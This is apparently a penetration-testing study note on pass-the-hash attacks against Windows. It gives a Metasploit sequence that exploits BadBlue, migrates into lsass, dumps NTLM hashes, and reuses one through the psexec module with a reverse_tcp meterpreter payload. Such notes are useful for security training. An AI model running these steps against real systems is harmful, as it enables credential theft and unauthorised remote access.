---
up: "[[Windows Post Exploitation]]"
---

# Pass-the-hash with PSExec

- Pass The Hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately
- We can use the PsExec module to legitimately authenticate with the target system via SMB
- Allows us to obtain access via legitimate credentials as opposed to obtaining access via service exploitation

## Demonstration

```bash
> use exploit/windows/http/badblue_passthru
> set target <target>
> exploit
m> pgrep lsass
m>  migrate <pid>
m>  getuid
m> hashdump
m> ^Z
> use exploit/windows/smb/psexec
> set payload windows/x64/meterpreter/reverse_tcp
> set SMBUser <user>
> set SMBPass <hash>
> exploit
m>
```
